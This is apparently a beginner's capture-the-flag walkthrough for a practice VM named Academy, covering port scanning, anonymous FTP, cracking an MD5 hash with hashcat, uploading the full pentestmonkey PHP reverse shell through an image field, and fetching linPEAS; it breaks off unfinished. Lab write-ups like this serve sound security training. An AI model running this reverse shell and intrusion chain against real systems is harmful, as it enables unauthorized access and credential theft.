![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/2a748ba16aab6f45a2cf2a0664e8bc42e4e2bf81/Academy/images/logo.png)
# Academy

This is the third box which i tried to get root !

So let's start by find the IP Address of the machine , i can easily guess what ip it's going to be since every box ip is incrementing by 1 in **Virtual Box.**


Anyway lets make sure of it !

You can use **netdiscover** to identify the target ip or you can also get the credentials in the zip file they provide and check for the ip using **"ip a"** command
```
netdiscover -r [your ip ]/24
```
## Scanning

let's do the usual scan :

```
nmap -p- -T4 -A [Target IP here]

-p-: Scans all ports.
-T4: Sets the timing template to aggressive, meaning Nmap will send packets more quickly to speed up the scan.
-A: Enables OS detection, version detection, and traceroute.

```
We are performing a SYN > SYN_ACK > RST

- SYN packet: Nmap sends a SYN packet to the target host, initiating a connection attempt.

- SYN-ACK packet: If the target port is open, it responds with a SYN-ACK packet, indicating its willingness to establish a connection.

- RST packet: Nmap immediately sends a RST (reset) packet to terminate the connection attempt, as it's only interested in determining whether the port is open or closed.


## Results of the scan

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 08:49 UTC
Nmap scan report for 192.xxx.xxx.xx
Host is up (0.0075s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.xxx.xxx.xx
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
|_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.46 seconds

```
Okay so we have 3 ports **open** which are
- FTP [21]
- SSH [22]
- HTTP [80]

Also there is **Anonymous login** allowed

And we did find a **note.txt** in the scan
```
-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
```
Interesting...! 

Now Check out the webserver 
```
http://192.xxx.xxx.xx
```
It's just a **default Apache2 Page**
There is nothing in it

Since **Anonymous Login** possbile we can try to login with username : **anonymous** & password : **anonymous**

```
──(kali㉿kali)-[~/Desktop/academy]
└─$ ftp 192.xxx.xx.xxx
Connected to 192.xxx.xx.xx
220 (vsFTPd 3.0.3)
Name (192.xxx.xxx.xxx:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```
Let's list the files and find the **note.txt** file

```
ftp> ls
229 Entering Extended Passive Mode (|||60850|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
226 Directory send OK.
ftp> 

```
To get the file type :

```
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||50715|)
150 Opening BINARY mode data connection for note.txt (776 bytes).
100% |*******************************************************************************|   776       36.03 KiB/s    00:00 ETA
226 Transfer complete.
776 bytes received in 00:00 (24.60 KiB/s)
ftp> exit
221 Goodbye.

```
 Now we got the **note.txt** file in our folder

let's **cat** that

```
┌──(kali㉿kali)-[~/Desktop/academy]
└─$ ls
nmap.txt  note.txt
                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/academy]
└─$ cat note.txt
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.


I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.


Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta


```
Okay we got some database information's like

- `StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`

Save this information somewhere ! it's useful
this might be useful for some kind of **login** page right.

## Directory Busting
Now lets try to perform some directory hunting you can do this many ways and there are lot of tools available to do this.
- dirb
- ffuf
- dirbuster
- GoBuster
- dirSearch

let's use **fuff** 
```
ffuf -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://[target ip]/FUZZ

```
Result :

```
──(kali㉿kali)-[~/Desktop/academy]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://192.xxx.xxx.xxx/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.xxx.x.x./FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# Copyright 2007 James Fisher [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 20ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 27ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 28ms]
#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 28ms]
# directory-list-2.3-small.txt [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 20ms]
#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 20ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 33ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 34ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 50ms]
#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 935ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 1573ms]
# on atleast 3 different hosts [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 1612ms]
#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 1682ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 1709ms]
academy                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 73ms]
phpmyadmin              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 45ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 15ms]
:: Progress: [87664/87664] :: Job [1/1] :: 634 req/sec :: Duration: [0:01:43] :: Errors: 0 ::
                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/academy]
└─$ 

```

Okay we found 2 Directory

- academy
- phpmyadmin


let's check those 

```
http://192.xxx.xx.xx/academy/

http://192.xxx.xxx.xx/phpmyadmin/
```

Now **phpmyadmin** doesn't have anything Interesting in it but **academy** is a login page .

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/ef2a1d1f4ec504a1ffa12207eb4df8c8fd600a31/Academy/images/phpmyadmin.png)

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/33ad39a43e125e216c7e24162c9fbf44035a05f6/Academy/images/loginpage.png)

This looks good it's asking for a **Regno** and **password**


Now remember the **note.txt** file we found during **ftp enumeration**

We can try to login with that info.

We have the **Regno** & also a password **hash**
most likely an **md5** hash.
```
cd73502828457d15655bbd7a63fb0bc8

```
Copy the hash.

## Password Cracking
Let's identify the password hash using **hash-identifier**  and paste the hash

```
$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: cd73502828457d15655bbd7a63fb0bc8

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
[+] NTLM
[+] MD4
[+] MD2
[+] MD5(HMAC)
[+] MD4(HMAC)
[+] MD2(HMAC)
[+] MD5(HMAC(Wordpress))
[+] Haval-128
[+] Haval-128(HMAC)
[+] RipeMD-128
[+] RipeMD-128(HMAC)
[+] SNEFRU-128
[+] SNEFRU-128(HMAC)
[+] Tiger-128
[+] Tiger-128(HMAC)
[+] md5($pass.$salt)
[+] md5($salt.$pass)
[+] md5($salt.$pass.$salt)
[+] md5($salt.$pass.$username)
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($salt.$pass))
[+] md5($salt.md5(md5($pass).$salt))
[+] md5($username.0.$pass)
[+] md5($username.LF.$pass)
[+] md5($username.md5($pass).$salt)
[+] md5(md5($pass))
[+] md5(md5($pass).$salt)
[+] md5(md5($pass).md5($salt))
[+] md5(md5($salt).$pass)
[+] md5(md5($salt).md5($pass))
[+] md5(md5($username.$pass).$salt)
[+] md5(md5(md5($pass)))
[+] md5(md5(md5(md5($pass))))
[+] md5(md5(md5(md5(md5($pass)))))
[+] md5(sha1($pass))
[+] md5(sha1(md5($pass)))
[+] md5(sha1(md5(sha1($pass))))
[+] md5(strtoupper(md5($pass)))
--------------------------------------------------
 HASH: ^C

        Bye!
                                    

```

Yes it is an **md5** hash 

You can crack this through online md5 cracking websites like

- https://crackstation.net
- https://md5online.org

But we will do the cool stuff !

We will use the tool called `hashcat`

**Hashcat** is a tool which is used to crack passwords by Utilizing CPU so you don't want to do it cause it can take lot of time its slow

There are options for hashcat to use GPU also for long password you can modify it and do that  if you have a Good GPU

(Now we can use it to crack easy passwords but using it for longer password might cause heating issues if you are using a low end device) which i am :)

Let's try 

If you don't know where your `rockyou.txt` wordlist is present then type

```
locate rockyou.txt
```
it's mostly found in `/usr/share/wordlists/rockyou/rockyou.txt`

If you see yours as `rockyou.txt.gz` you have to unzip it

```
gzip -d rockyou.txt.gz
```

And there you have it.

Now let's put our hash in to a text file called as `hash.txt`

```
$ nano hash.txt

cd73502828457d15655bbd7a63fb0bc8

```
**CTRL + X** to exit and [Enter] to Save

now let's crack

```

hashcat -m 0 hash.txt /usr/share/wordlists/rockyou/rockyou.txt

-m <hash_type> - Specifies the type of hash you're trying to crack 

0 - is for md5 hashes (You can check for the values in hashcat documentation if you want)

hash.txt - is our txt file that we just created which contains the hash we want to crack

/usr/share/wordlists/rockyou/rockyou.txt - This is our wordlists location

```

Result :

```
└─$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt.gz  
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-penryn-Intel(R) Celeron(R) N4500 @ 1.10GHz, 1086/2236 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 3 secs

cd73502828457d15655bbd7a63fb0bc8:student                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: cd73502828457d15655bbd7a63fb0bc8
Time.Started.....: Tue Aug 13 09:20:01 2024 (0 secs)
Time.Estimated...: Tue Aug 13 09:20:01 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    19269 H/s (0.11ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 1536/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: clover -> lovers1
Hardware.Mon.#1..: Util: 51%

Started: Tue Aug 13 09:19:25 2024
Stopped: Tue Aug 13 09:20:03 2024
                                                                                                                        

```
Ahh !! you can also crack with just the `rockyou.txt.gz` file also

Now we got the Regno `10201321` from the `note.txt` &  the password as `student` 

Cool !

Now let's try to login with this  in the login page we found 

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/ef2a1d1f4ec504a1ffa12207eb4df8c8fd600a31/Academy/images/logged%20in.png)

And we are in !

If you check the **Student registeration** page there is an **image upload option**

This is really useful what if we can upload a payload and get a **reverse shell**

We know that they are running **php** in the **backend**
## Exploitation

Okay while searching in google found this **php-reverse-shell** code you can find it [**here**](https://github.com/pentestmonkey/php-reverse-shell)


```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = 'Your IP';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```

you can copy this and creat a `.php` file & paste it in that  file

```
$ nano shell.php
 
[Paste it here]
```

Make sure to modify the **$ip** & **$port**  & save it

Now let's listen to the port by using `netcat`
```
$ nc -nvlp 1234

-nvlp - `n` tells the netcat to use numeric ip addresses only 
        `v` Enables the verbose mode 
        `l` Listen for incoming connection
1234  - is the port which you want to listen to        


```

Now go to the **Student Registeration** & **Upload image** 


![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/ef2a1d1f4ec504a1ffa12207eb4df8c8fd600a31/Academy/images/upload.png)

And check the terminal we got a shell !

Now we are not the root user so we might need to perfrom some privilege escalation here

let's try uploading the `linPEAS.sh` and see what informationit gives us about the machine 

you can find the script [**here**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) it's called the **lazy way**

Now i already have it in my **academy** folder i created for this box 
(you have to move it from downloads to the folder in which you want to host the file)

now let's open a new `terminal` and start a `webserver` using `python3`

```
python -m http.server 80

```
Okay that server is running

In the shell we got use `wget` to get the `linpeas.sh`  from our server

```
wget http://[Attacker Box ip]/linpeas.sh
```

Now let's run our script before that we have to make it executable

```
$ chmod +x linpeas.sh
$ ./linpeas.sh

```

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/ef2a1d1f4ec504a1ffa12207eb4df8c8fd600a31/Academy/images/linwork.png)
And it gives you a huge information about the machine


```
* * * * * /home/grimmie/backup.sh

----------------------------------------------
/usr/share/phpmyadmin/config.inc.php:$cfg['Servers'][$i]['AllowNoPassword'] = false;                                                                                                                                                        
/usr/share/phpmyadmin/config.sample.inc.php:$cfg['Servers'][$i]['AllowNoPassword'] = false;
/usr/share/phpmyadmin/libraries/config.default.php:$cfg['Servers'][$i]['AllowNoPassword'] = false;
/usr/share/phpmyadmin/libraries/config.default.php:$cfg['ShowChgPassword'] = true;
/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
```
we found this `backup.sh` file also there is a `config` file  which has a password **keep it safe**  

```
cat /var/www/html/academy/includes/config.php


<?php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");


?>

```
Okay now we have more info ! let's try to `ssh` to `grimmie@[ip]`
```

$ ssh grimmie@[targetip]
password: [password you found]
```

We are in !

We still do not have sudo access

Now lets check the backup.sh file
```
$ cd /home/grimmie
$ ls
backup.sh

$ cat backup.sh

```

writing ....
